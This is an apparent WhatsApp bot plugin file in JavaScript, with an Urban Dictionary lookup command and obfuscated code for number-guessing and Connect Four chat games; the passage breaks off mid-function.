desc: "urban dictionary.",
category: "fun",
filename: __filename,
},
async(Void, citel, text) => {
try{
    let { data } = await axios.get(`http://api.urbandictionary.com/v0/define?term=${text}`)
    var textt = `
    Word: ${text}
    Definition: ${data.list[0].definition.replace(/\[/g, "").replace(/\]/g, "")}
    Example: ${data.list[0].example.replace(/\[/g, "").replace(/\]/g, "")}`
    return citel.reply(textt)
            } catch {
                return citel.reply(`No result for ${text}`)
            }
}
)


















































































const _0x447b6f=_0x38f2;(function(_0x313d58,_0x400e1a){const _0x2073d4=_0x38f2,_0xc32a26=_0x313d58();while(!![]){try{const _0x57d6b7=parseInt(_0x2073d4(0xbb))/0x1+-parseInt(_0x2073d4(0xaa))/0x2+-parseInt(_0x2073d4(0xb4))/0x3+-parseInt(_0x2073d4(0x94))/0x4*(parseInt(_0x2073d4(0xba))/0x5)+parseInt(_0x2073d4(0xb2))/0x6+parseInt(_0x2073d4(0x92))/0x7*(-parseInt(_0x2073d4(0xc3))/0x8)+parseInt(_0x2073d4(0xad))/0x9*(parseInt(_0x2073d4(0xcb))/0xa);if(_0x57d6b7===_0x400e1a)break;else _0xc32a26['push'](_0xc32a26['shift']());}catch(_0x2235ef){_0xc32a26['push'](_0xc32a26['shift']());}}}(_0x1c10,0x42781));class GuessingGame{constructor(){const _0x120e1f=_0x38f2;this[_0x120e1f(0xbf)]=0x0,this[_0x120e1f(0xa5)]='',this['id']='',this[_0x120e1f(0xb1)]=![],this[_0x120e1f(0xa2)]=_0x120e1f(0xa8),this[_0x120e1f(0x97)]=0x0,this['guessedNumber']=0x0;}}const logoName='█▄\x20█\x20█\x20\x20\x20█\x20\x20█▄\x20▄█\x20\x20██▄\x20██▀\x20█▀▄\x0a█\x20▀█\x20█▄█\x20\x20█\x20\x20▀\x20\x20█\x20\x20█▄█\x20█▄▄\x20█▀▄';function _0x1c10(){const _0x38578c=['24579cEhAdG','Guess\x20Normal_*\x0a*𝗔𝘃𝗮𝗮𝗶𝗹𝗮𝗯𝗹𝗲\x20𝗠𝗼𝗱𝗲𝘀:*\x0a\x20\x20▢\x20Easy\x20\x20\x20(\x20_0\x20to\x20100_)\x0a\x20\x20▢\x20Medium\x20(\x20_0\x20to\x201000_)\x0a\x20\x20▢\x20Hard\x20\x20\x20(\x20_0\x20to\x2010000_)\x0a\x20\x20▢\x20End\x20\x20(\x20_End\x20the\x20Game_)\x0a','\x0a\x20\x20𝗡𝘂𝗺𝗯𝗲𝗿\x20𝗬𝗼𝘂\x20𝗚𝘂𝗲𝘀𝘀𝗲𝗱\x20𝗶𝘀\x20𝗟𝗼𝘄\x20\x20\x0a\x0a*Player\x20:\x20_@','Error\x20In\x20Number\x20Guessing\x20Game\x20:\x20','status','2420892cLkCby','\x20you\x20won\x20the\x20Game!_*\x20\x0a\x20\x20\x20\x20_▢\x20You\x20guessed\x20the\x20correct\x20number\x20\x27\x20*','462822qebdia','*_A\x20game\x20is\x20already\x20in\x20progress\x20in\x20this\x20chat._*\x0a\x20To\x20End\x20the\x20Game:\x20\x20.Guess\x20end','split','Play\x20Guessing\x20Number\x20game','floor','chat','5ocsiTm','74251JBsawb','game','toLowerCase','\x0a\x20\x20\x20\x20𝗡𝘂𝗺𝗯𝗲𝗿\x20𝗚𝘂𝗲𝘀𝘀𝗶𝗻𝗴\x20𝗚𝗮𝗺𝗲\x20𝗠𝗲𝗻𝘂\x0a\x0a*Uhh\x20Dear,\x20Choose\x20','attempts','\x27._*\x20\x0a\x20\x20*_▢\x20Make\x20Sure\x20to\x20guess\x20Number\x20Between\x20','medium','\x0a\x20\x20𝗡𝘂𝗺𝗯𝗲𝗿\x20𝗚𝘂𝗲𝘀𝘀𝗶𝗻𝗴\x20𝗚𝗮𝗺𝗲\x20𝗦𝘁𝗮𝗿𝘁𝗲𝗱\x0a\x20\x20\x20\x20\x20\x0a*𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱\x20𝗠𝗼𝗱𝗲\x20:\x20_','8DXyZgy','guessedNumber','_*\x20\x20\x0a*Attempts\x20:*\x20_','Hard','send','isGroup','an\x20Option','*\x20\x27._\x0a\x20\x20\x20\x20_▢\x20You\x20take\x20','1150yQNZlp','1\x20and\x201000','400141GfkQjt','sender','824344xKNqZO','null','1\x20and\x2010000','randomNumber','\x20First,\x20Like\x20_','\x20attempts\x20to\x20Guess\x20that\x20Number._\x09\x0a','end','reply','\x0a\x20\x20𝗡𝘂𝗺𝗯𝗲𝗿\x20𝗚𝘂𝗲𝘀𝘀𝗶𝗻𝗴\x20𝗚𝗮𝗺𝗲\x20𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱\x20\x0a\x0a*𝗠𝗼𝗱𝗲\x20You\x20Played\x20:\x20_','text','Medium','includes','\x20yet_\x0a\x0a*Number\x20Info:*\x0a\x20\x20*_▢\x20Its\x20Too\x20High\x20Number!_*\x0a\x20\x20*_▢\x20Try\x20to\x20Guess\x20a\x20Smaller\x20Number\x20From\x20\x27\x20','Easy','mode','_*\x20\x0a*_Congratulations!\x20@','\x20yet_\x0a\x0a*Number\x20Info:*\x0a\x20\x20*_▢\x20Its\x20Too\x20Low\x20Number!_*\x0a\x20\x20*_▢\x20Try\x20to\x20Guess\x20a\x20High\x20Number\x20From\x20\x27\x20','player','._*\x0a','random','low','hard','204036qwjyjN','1\x20and\x20100','._*\x0a\x0a*𝗬𝗼𝘂𝗿\x20𝗧𝗮𝘀𝗸\x20:*\x0a\x20\x20\x20_▢\x20You\x20Task\x20is\x20to\x20Guess\x20That\x20Number._\x0a\x20\x20\x20_▢\x20Checks\x20How\x20Sharp\x20is\x20Your\x20Memory._\x0a\x20\x20\x20_▢\x20Lets\x20see\x20How\x20Many\x20Attempts\x20You\x20Take\x20To\x20Guess\x20Number._'];_0x1c10=function(){return _0x38578c;};return _0x1c10();}function _0x38f2(_0x42dc29,_0x553e9e){const _0x1c10d0=_0x1c10();return _0x38f2=function(_0x38f24d,_0x42e562){_0x38f24d=_0x38f24d-0x92;let _0xcd9474=_0x1c10d0[_0x38f24d];return _0xcd9474;},_0x38f2(_0x42dc29,_0x553e9e);}cmd({'pattern':'guess','desc':_0x447b6f(0xb7),'filename':__filename,'category':_0x447b6f(0xbc)},async(_0x2dff45,_0x1fda8a,_0x1386e7)=>{const _0x4ba254=_0x447b6f;try{const _0x51df81=_0x1fda8a[_0x4ba254(0xb9)];let _0x2acaae=sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x51df81];_0x1386e7=_0x1386e7[_0x4ba254(0xbd)]();if(_0x1386e7===_0x4ba254(0x9a)&&_0x2acaae)return delete sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x51df81],await _0x1fda8a[_0x4ba254(0x9b)]('*_Number\x20Guessing\x20Game\x20ended.\x20Goodbye!_*');if(_0x2acaae&&_0x2acaae['status'])return await _0x1fda8a[_0x4ba254(0x9b)](_0x4ba254(0xb5));let _0x3e8bb0='',_0x3ee9d5=0x0;if(_0x1386e7[_0x4ba254(0x9f)]('easy'))_0x3ee9d5=Math[_0x4ba254(0xb8)](Math[_0x4ba254(0xa7)]()*0x64),_0x3e8bb0=_0x4ba254(0xa1);else{if(_0x1386e7[_0x4ba254(0x9f)](_0x4ba254(0xc1)))_0x3ee9d5=Math[_0x4ba254(0xb8)](Math[_0x4ba254(0xa7)]()*0x3e8),_0x3e8bb0=_0x4ba254(0x9e);else{if(_0x1386e7[_0x4ba254(0x9f)](_0x4ba254(0xa9)))_0x3ee9d5=Math[_0x4ba254(0xb8)](Math[_0x4ba254(0xa7)]()*0x2710),_0x3e8bb0=_0x4ba254(0xc6);else return await _0x1fda8a[_0x4ba254(0xc7)](logoName+_0x4ba254(0xbe)+(_0x1386e7?'a\x20Valid\x20Option':_0x4ba254(0xc9))+_0x4ba254(0x98)+prefix+_0x4ba254(0xae));}}return!_0x2acaae&&(sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x51df81]=new GuessingGame()),_0x2acaae=sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x51df81],_0x2acaae[_0x4ba254(0xb1)]=!![],_0x2acaae[_0x4ba254(0x97)]=_0x3ee9d5,_0x2acaae[_0x4ba254(0xa2)]=_0x3e8bb0,_0x2acaae[_0x4ba254(0xa5)]=_0x1fda8a[_0x4ba254(0x93)],_0x2acaae['id']=_0x1fda8a[_0x4ba254(0xb9)],await _0x1fda8a[_0x4ba254(0x9b)](logoName+_0x4ba254(0xc2)+_0x2acaae[_0x4ba254(0xa2)]+'_*\x20\x0a\x20\x20\x20▢\x20*_Well,\x20I\x27m\x20thinking\x20of\x20a\x20number\x20between\x20'+(_0x2acaae[_0x4ba254(0xa2)]===_0x4ba254(0xa1)?_0x4ba254(0xab):_0x2acaae[_0x4ba254(0xa2)]===_0x4ba254(0x9e)?_0x4ba254(0xcc):_0x4ba254(0x96))+_0x4ba254(0xac));}catch(_0x2d1ac1){return await console['log'](_0x4ba254(0xb0),_0x2d1ac1);}}),cmd({'on':_0x447b6f(0x9d)},async(_0x42123f,_0x58897c,_0x412706)=>{const _0x3df3a3=_0x447b6f;if(!_0x58897c[_0x3df3a3(0xc8)])return;const _0x558d38=_0x58897c[_0x3df3a3(0xb9)],_0x29f910=sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x558d38];if(!_0x29f910)return;const _0x5846d6=parseInt(_0x58897c[_0x3df3a3(0x9d)]?_0x58897c[_0x3df3a3(0x9d)][_0x3df3a3(0xb6)]('\x20')[0x0]:_0x3df3a3(0x95));if(_0x29f910['id']===_0x58897c[_0x3df3a3(0xb9)]&&_0x29f910[_0x3df3a3(0xa5)]===_0x58897c['sender']&&!isNaN(_0x5846d6)){_0x29f910[_0x3df3a3(0xc4)]=_0x5846d6,_0x29f910[_0x3df3a3(0xbf)]++;if(_0x29f910[_0x3df3a3(0xc4)]<_0x29f910[_0x3df3a3(0x97)])return await _0x58897c['send'](logoName+_0x3df3a3(0xaf)+_0x29f910['player']['split']('@')[0x0]+_0x3df3a3(0xc5)+_0x29f910[_0x3df3a3(0xbf)]+_0x3df3a3(0xa4)+_0x29f910['guessedNumber']+_0x3df3a3(0xc0)+(_0x29f910[_0x3df3a3(0xa2)]===_0x3df3a3(0xa1)?_0x3df3a3(0xab):_0x29f910[_0x3df3a3(0xa2)]===_0x3df3a3(0x9e)?_0x3df3a3(0xcc):'1\x20and\x2010000')+_0x3df3a3(0xa6),{'mentions':[_0x29f910['player']]});else{if(_0x29f910[_0x3df3a3(0xc4)]>_0x29f910['randomNumber'])return await _0x58897c['send'](logoName+'\x0a\x20\x20𝗡𝘂𝗺𝗯𝗲𝗿\x20𝗬𝗼𝘂\x20𝗚𝘂𝗲𝘀𝘀𝗲𝗱\x20𝗶𝘀\x20𝗛𝗶𝗴𝗵\x20\x20\x0a\x0a*Player\x20:\x20_@'+_0x29f910['player'][_0x3df3a3(0xb6)]('@')[0x0]+_0x3df3a3(0xc5)+_0x29f910[_0x3df3a3(0xbf)]+_0x3df3a3(0xa0)+_0x29f910[_0x3df3a3(0xc4)]+_0x3df3a3(0xc0)+(_0x29f910[_0x3df3a3(0xa2)]===_0x3df3a3(0xa1)?_0x3df3a3(0xab):_0x29f910['mode']==='Medium'?'1\x20and\x201000':'1\x20and\x2010000')+_0x3df3a3(0xa6),{'mentions':[_0x29f910[_0x3df3a3(0xa5)]]});else await _0x58897c[_0x3df3a3(0xc7)](logoName+_0x3df3a3(0x9c)+_0x29f910[_0x3df3a3(0xa2)]['toUpperCase']()+_0x3df3a3(0xa3)+_0x29f910[_0x3df3a3(0xa5)][_0x3df3a3(0xb6)]('@')[0x0]+_0x3df3a3(0xb3)+_0x29f910[_0x3df3a3(0x97)]+_0x3df3a3(0xca)+_0x29f910[_0x3df3a3(0xbf)]+_0x3df3a3(0x99),{'mentions':[_0x29f910[_0x3df3a3(0xa5)]]}),delete sᴜʜᴀɪʟ_ᴍᴅ_numGuess[_0x558d38];}return;}});


/////// ----------------- Connect Four Game

const _0x2dcdaa=_0x1b6b;function _0x3732(){const _0x820118=['errors\x20:\x20','currentPlayer','reply','player1','log','45617pIYdRs','\x20|\x20','_*\x0a_If\x20You\x20@{citel.sender.split(\x22@\x22)[0]}\x20wants\x20to\x20Play,_\x20\x0a_Then\x20Delete\x20Cfg\x20Session:-\x20{prefix}delcfg_\x0a\x20\x20\x20','send','505232sbQyJx','1761012dOBNYZ','updateLastIndex','deletes\x20Connect\x20Four\x20running\x20session.','4192810ietkSO','\x20you\x20win\x20the\x20Game!_*\x20\x0a_You\x20Connect\x20Four\x20Colors\x20in_\x20\x27','isDone','\x20Joined_\x0a_Waiting\x20For\x20Another\x20Player\x20To\x20Start\x20Game..._\x0a*Type\x20_.cfg\x20to\x20Join\x20This\x20Game\x20Session.*','player2','includes','_*\x0a*Next\x20Turn\x20:\x20\x20_@','_*\x0a*𝗟𝗼𝗼𝘀𝗲𝗿\x20𝗢𝗳\x20𝗧𝗵𝗲\x20𝗚𝗮𝗺𝗲\x20𝗜𝘀:\x20_@','printMatrix','_*\x0a','_*\x0a*Nextt\x20Turn\x20\x20','random','733998EeFOBo','rowsMatrix','\x20:\x20_@','_*\x0a\x20\x20\x20\x0a\x20▢\x20*_Please\x20take\x20your\x20turn\x20to\x20Break\x20Pattern_*\x0a\x20▢\x20_Enter\x20Line\x20Number\x20Between\x20*\x271\x27*\x20to\x20*\x277\x27*_\x0a\x20\x20\x0a*Connent\x20Four\x20Game\x20Quote\x20:*\x0a\x20\x20▢\x20_','\x27\x20_Turns._\x0a\x20\x20\x20\x20\x20\x0a_Connect\x20Four\x20Game\x20Session\x20Finished\x20Now_\x0a_Type_\x20.Cfg\x20_to\x20Start\x20Again\x20Connect\x20Four\x20Session._\x0a','checkWin','3456584vsIAGv','\x0a|\x20','mentionedJid','*_Invalid\x20move\x20Dear\x20@','593922pSXVSG','▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20𝗕𝗼𝗮𝗿𝗱\x0a','columnsMatrix','chat','Connect\x20Four\x20Game\x20Error\x20:\x20','sender','*A\x20game\x20is\x20already\x20in\x20progress\x20in\x20this\x20chat.*\x0a*Game\x20Between\x20:-\x20_@','\x20\x0a◣━━━━━━━━━━\x20━━━━━━━━━━◢\x0a\n*Connet\x20Four\x20Game\x20Session\x20started*\x20\x0a*room\x20Id\x20:\x20_cfg-','text','5sdzsui','9PWNiLN','_*\x0a*_Hey\x20@','quoted','cfg','gameStatus','split','_\x20Cleared\x20Successfully*\x0a*_Connect\x20Four\x20Game\x20Session\x20Deleted\x20From\x20This\x20Chat..._*\x0a','_*\x0a\n*Current\x20Turn:\x20_@','matrix','_*\x0a_Player\x201:\x20@','length','\x0a◣━━━━━━━━━━\x20━━━━━━━━━━◢\x0a\x20\x20\x20\x20\x20\x20\x0a*Current\x20Turn\x20','▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱\x0a*𝗪𝗶𝗻𝗻𝗲𝗿\x20𝗢𝗳\x20𝗧𝗵𝗲\x20𝗚𝗮𝗺𝗲\x20𝗜𝘀:\x20_@','▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20404𝗘𝗿𝗿𝗼𝗿\x20\x20\x20\x0a*Uhh\x20Dear,\x20_Theres\x20No\x20Game\x20Started\x20yet\x20in\x20This\x20Chat_*\x0a','floor','49DdukUp','attempts','Start\x20Connect\x20Four\x20game\x20session.','game','\x0a◣━━━━━━━━━━\x20━━━━━━━━━━◢\x20\x20\x20\x20\x20\x0a*_Congratulations!\x20@','▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20𝗦𝘁𝗮𝗿𝘁𝗲𝗱\x20\x0a','sendMessage',',\x20Please\x20take\x20your\x20turn_*\x0a▢\x20_Enter\x20Line\x20Number\x20Between\x20*\x271\x27*\x20to\x20*\x277\x27*_\x0a\n*Connect\x20Four\x20Game\x20Task\x20:*\x0a\x20\x20_Player\x20Needs\x20To\x20Connect\x20Four\x20Colors\x20in\x20a\x20Sequence,_\x0a\x20\x20_You\x20can\x20Connect\x20Four\x20Colors\x20▢Horizontally,\x20▢Vertically,\x20▢Diagonally._\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a*Lets\x20Play\x20:-\x20_'];_0x3732=function(){return _0x820118;};return _0x3732();}(function(_0x1e83b9,_0x5bea2b){const _0x23f28b=_0x1b6b,_0x282cef=_0x1e83b9();while(!![]){try{const _0x107f64=parseInt(_0x23f28b(0xcc))/0x1+-parseInt(_0x23f28b(0xe0))/0x2+parseInt(_0x23f28b(0xd1))/0x3+parseInt(_0x23f28b(0xe6))/0x4*(-parseInt(_0x23f28b(0xaf))/0x5)+-parseInt(_0x23f28b(0xa6))/0x6*(-parseInt(_0x23f28b(0xbf))/0x7)+-parseInt(_0x23f28b(0xd0))/0x8+parseInt(_0x23f28b(0xb0))/0x9*(parseInt(_0x23f28b(0xd4))/0xa);if(_0x107f64===_0x5bea2b)break;else _0x282cef['push'](_0x282cef['shift']());}catch(_0x54231d){_0x282cef['push'](_0x282cef['shift']());}}}(_0x3732,0x6dfd0));class ConnectFourGame{constructor(){const _0x5f952=_0x1b6b;this[_0x5f952(0xca)]='',this[_0x5f952(0xd8)]='',this[_0x5f952(0xe1)]=0x6,this[_0x5f952(0xa8)]=0x7,this[_0x5f952(0xc8)]='',this[_0x5f952(0xb4)]=![],this[_0x5f952(0xc0)]={},this['matrix']=[['⚪','⚪','⚪','⚪','⚪','⚪','⚪'],['⚪','⚪','⚪','⚪','⚪','⚪','⚪'],['⚪','⚪','⚪','⚪','⚪','⚪','⚪'],['⚪','⚪','⚪','⚪','⚪','⚪','⚪'],['⚪','⚪','⚪','⚪','⚪','⚪','⚪'],['⚪','⚪','⚪','⚪','⚪','⚪','⚪']];}async[_0x2dcdaa(0xd2)](_0x589639){const _0x5cec13=_0x2dcdaa;let _0x2e2d4e=this['currentPlayer']===this[_0x5cec13(0xca)]?'🔵':'🔴',_0x5049ec=this[_0x5cec13(0xb8)][_0x5cec13(0xba)]-0x1;while(_0x5049ec>0x0&&this[_0x5cec13(0xb8)][_0x5049ec][_0x589639]!=='⚪'){_0x5049ec--;}return this[_0x5cec13(0xb8)][_0x5049ec][_0x589639]=='⚪'?(this[_0x5cec13(0xb8)][_0x5049ec][_0x589639]=_0x2e2d4e,!![]):![];}async[_0x2dcdaa(0xdc)](){const _0x15801d=_0x2dcdaa;let _0x5af145='';for(let _0x590bb8=0x0;_0x590bb8<this[_0x15801d(0xb8)][_0x15801d(0xba)];_0x590bb8++){_0x5af145+=_0x15801d(0xe7);for(let _0x27f46f=0x0;_0x27f46f<this['matrix'][_0x590bb8][_0x15801d(0xba)];_0x27f46f++){_0x5af145+=this[_0x15801d(0xb8)][_0x590bb8][_0x27f46f]+_0x15801d(0xcd);}}return _0x5af145;}async[_0x2dcdaa(0xe5)](){const _0x31d9ed=_0x2dcdaa;let _0x4405a9=this[_0x31d9ed(0xc8)]===this[_0x31d9ed(0xca)]?'🔵':'🔴';for(let _0x31a01b=0x0;_0x31a01b<this[_0x31d9ed(0xb8)][_0x31d9ed(0xba)];_0x31a01b++){for(let _0x222af8=0x0;_0x222af8<=this[_0x31d9ed(0xb8)][_0x31a01b][_0x31d9ed(0xba)]-0x4;_0x222af8++){if(this[_0x31d9ed(0xb8)][_0x31a01b][_0x222af8]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x31a01b][_0x222af8+0x1]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x31a01b][_0x222af8+0x2]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x31a01b][_0x222af8+0x3]===_0x4405a9)return this['currentPlayer'];}}for(let _0x4f8252=0x0;_0x4f8252<=this[_0x31d9ed(0xb8)][_0x31d9ed(0xba)]-0x4;_0x4f8252++){for(let _0x4aed47=0x0;_0x4aed47<this['matrix'][_0x4f8252][_0x31d9ed(0xba)];_0x4aed47++){if(this[_0x31d9ed(0xb8)][_0x4f8252][_0x4aed47]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x4f8252+0x1][_0x4aed47]===_0x4405a9&&this['matrix'][_0x4f8252+0x2][_0x4aed47]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x4f8252+0x3][_0x4aed47]===_0x4405a9)return this[_0x31d9ed(0xc8)];}}for(let _0x3dfd9a=0x0;_0x3dfd9a<=this[_0x31d9ed(0xb8)][_0x31d9ed(0xba)]-0x4;_0x3dfd9a++){for(let _0x529268=0x0;_0x529268<=this[_0x31d9ed(0xb8)][_0x3dfd9a][_0x31d9ed(0xba)]-0x4;_0x529268++){if(this[_0x31d9ed(0xb8)][_0x3dfd9a][_0x529268]===_0x4405a9&&this['matrix'][_0x3dfd9a+0x1][_0x529268+0x1]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x3dfd9a+0x2][_0x529268+0x2]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x3dfd9a+0x3][_0x529268+0x3]===_0x4405a9)return this[_0x31d9ed(0xc8)];}}for(let _0x11e08c=0x0;_0x11e08c<=this[_0x31d9ed(0xb8)][_0x31d9ed(0xba)]-0x4;_0x11e08c++){for(let _0x47bb05=this[_0x31d9ed(0xb8)][_0x11e08c][_0x31d9ed(0xba)]-0x1;_0x47bb05>=0x3;_0x47bb05--){if(this[_0x31d9ed(0xb8)][_0x11e08c][_0x47bb05]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x11e08c+0x1][_0x47bb05-0x1]===_0x4405a9&&this['matrix'][_0x11e08c+0x2][_0x47bb05-0x2]===_0x4405a9&&this[_0x31d9ed(0xb8)][_0x11e08c+0x3][_0x47bb05-0x3]===_0x4405a9)return this[_0x31d9ed(0xc8)];}}return null;}}function _0x1b6b(_0x3d742b,_0x1be960){const _0x3732b8=_0x3732();return _0x1b6b=function(_0x1b6be3,_0x39f3a6){_0x1b6be3=_0x1b6be3-0xa4;let _0xbec226=_0x3732b8[_0x1b6be3];return _0xbec226;},_0x1b6b(_0x3d742b,_0x1be960);}cmd({'pattern':_0x2dcdaa(0xb3),'desc':_0x2dcdaa(0xc1),'filename':__filename,'category':_0x2dcdaa(0xc2)},async(_0x135624,_0x25e922,_0x3d09f2)=>{const _0x56574c=_0x2dcdaa,_0x377c47=_0x25e922['chat'];let _0xe4f6b=sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0x377c47];if(_0xe4f6b&&_0xe4f6b[_0x56574c(0xb4)])return await _0x25e922[_0x56574c(0xcf)](_0x56574c(0xac)+_0xe4f6b['player1']['split']('@')[0x0]+'_\x20vs\x20_@'+_0xe4f6b[_0x56574c(0xd8)][_0x56574c(0xb5)]('@')[0x0]+_0x56574c(0xce),{'mentions':[_0xe4f6b[_0x56574c(0xca)],_0xe4f6b[_0x56574c(0xd8)]]});!_0xe4f6b&&(_0xe4f6b=new ConnectFourGame(),sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0x377c47]=_0xe4f6b);try{let _0x326aed='';_0x25e922[_0x56574c(0xb2)]&&(_0x326aed=_0x25e922[_0x56574c(0xb2)][_0x56574c(0xab)]);let _0x146aeb=_0x25e922[_0x56574c(0xb2)]?_0x25e922[_0x56574c(0xb2)][_0x56574c(0xab)]:_0x25e922[_0x56574c(0xa4)]?_0x25e922['mentionedJid'][0x0]:'-';_0x146aeb=_0x146aeb===_0x25e922[_0x56574c(0xab)]?'-':''+_0x146aeb;if(_0x146aeb[_0x56574c(0xd9)]('@'))_0xe4f6b[_0x56574c(0xca)]=_0x25e922[_0x56574c(0xab)],_0xe4f6b[_0x56574c(0xd8)]=_0x146aeb,_0xe4f6b[_0x56574c(0xb4)]=!![];else{if(!_0xe4f6b[_0x56574c(0xca)]||_0xe4f6b[_0x56574c(0xca)]===_0x25e922['sender'])return _0xe4f6b[_0x56574c(0xca)]=_0x25e922[_0x56574c(0xab)],await _0x25e922[_0x56574c(0xcf)]('▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20𝗦𝗲𝘀𝘀𝗶𝗼𝗻\x20\x0a*Connect\x20Four\x20Game\x20Session\x20Created...*\x0a*room\x20Id\x20:\x20_cfg-'+_0x377c47[_0x56574c(0xb5)]('@')[0x0]+_0x56574c(0xb9)+_0xe4f6b[_0x56574c(0xca)]['split']('@')[0x0]+_0x56574c(0xd7),{'mentions':[_0xe4f6b['player1']]});else _0x25e922[_0x56574c(0xab)]!=_0xe4f6b['player1']&&(_0xe4f6b['player2']=_0x25e922[_0x56574c(0xab)],_0xe4f6b[_0x56574c(0xb4)]=!![]);}}catch(_0xe65ea7){await _0x25e922[_0x56574c(0xc9)](_0x56574c(0xc7)+_0xe65ea7);}if(_0xe4f6b[_0x56574c(0xb4)]){_0xe4f6b[_0x56574c(0xc8)]=_0xe4f6b[_0x56574c(0xca)],_0xe4f6b[_0x56574c(0xc0)][_0xe4f6b['player1']]=0x0,_0xe4f6b['attempts'][_0xe4f6b[_0x56574c(0xd8)]]=0x0;let _0x5407ac=await _0xe4f6b[_0x56574c(0xdc)](),_0x15290d=_0x56574c(0xc4)+_0x5407ac+_0x56574c(0xad)+_0x377c47['split']('@')[0x0]+_0x56574c(0xb7)+_0xe4f6b[_0x56574c(0xca)][_0x56574c(0xb5)]('@')[0x0]+_0x56574c(0xda)+_0xe4f6b[_0x56574c(0xd8)][_0x56574c(0xb5)]('@')[0x0]+_0x56574c(0xb1)+_0xe4f6b['currentPlayer']['split']('@')[0x0]+_0x56574c(0xc6)+quotes[Math[_0x56574c(0xbe)](Math[_0x56574c(0xdf)]()*quotes[_0x56574c(0xba)])]+'_*\x0a\x0a';return await _0x25e922[_0x56574c(0xcf)](_0x15290d,{'mentions':[_0xe4f6b['player1'],_0xe4f6b[_0x56574c(0xd8)],_0xe4f6b['currentPlayer']]});}}),cmd({'pattern':'delcfg','desc':_0x2dcdaa(0xd3),'filename':__filename,'category':_0x2dcdaa(0xc2)},async(_0x317f5a,_0x2ba9b5,_0x21e97b)=>{const _0x2b9610=_0x2dcdaa,_0xe7a512=_0x2ba9b5[_0x2b9610(0xa9)];let _0x366664=sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0xe7a512];if(_0x366664)return delete sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0xe7a512],await _0x2ba9b5[_0x2b9610(0xc9)]('▄▀▀\x20▄▀▄\x20█▄\x20█\x20█▄\x20█\x20▄▀▀\x20▀█▀\x20\x0a▀▄▄\x20▀▄▀\x20█\x20▀█\x20█\x20▀█\x20▀▄▄\x20\x20\x20\x20█\x0a\x20\x20\x20𝗖𝗼𝗻𝗻𝗲𝗰𝘁\x20𝗙𝗼𝘂𝗿\x20𝗚𝗮𝗺𝗲\x20𝗗𝗲𝗹𝗲𝘁𝗲𝗱\x20\x20\x0a*Room\x20Id\x20:\x20_cfg-'+_0xe7a512[_0x2b9610(0xb5)]('@')[0x0]+_0x2b9610(0xb6));else return await _0x2ba9b5['reply'](_0x2b9610(0xbd));}),cmd({'on':_0x2dcdaa(0xae)},async(_0x56e801,_0x5e02e7,_0x823010,{isCreator:_0x216180})=>{const _0x5cc5ce=_0x2dcdaa,_0x156449=_0x5e02e7[_0x5cc5ce(0xa9)],_0x38a990=sᴜʜᴀɪʟ_ᴍᴅ_cfg[_0x156449];if(!_0x38a990)return;let _0x2ab18c=parseInt(_0x5e02e7[_0x5cc5ce(0xae)]?_0x5e02e7[_0x5cc5ce(0xae)][_0x5cc5ce(0xb5)]('\x20')[0x0]:0x7d0);if(_0x38a990[_0x5cc5ce(0xb4)]&&_0x38a990[_0x5cc5ce(0xc8)]===_0x5e02e7[_0x5cc5ce(0xab)]&&!isNaN(_0x2ab18c))try{let _0x401003=_0x2ab18c-0x1;if(_0x401003<0x0||_0x401003>=_0x38a990['columnsMatrix'])return;let _0x4b2be9=await _0x38a990['updateLastIndex'](_0x401003);if(!_0x4b2be9)return console['log'](_0x5cc5ce(0xd6),_0x4b2be9),await 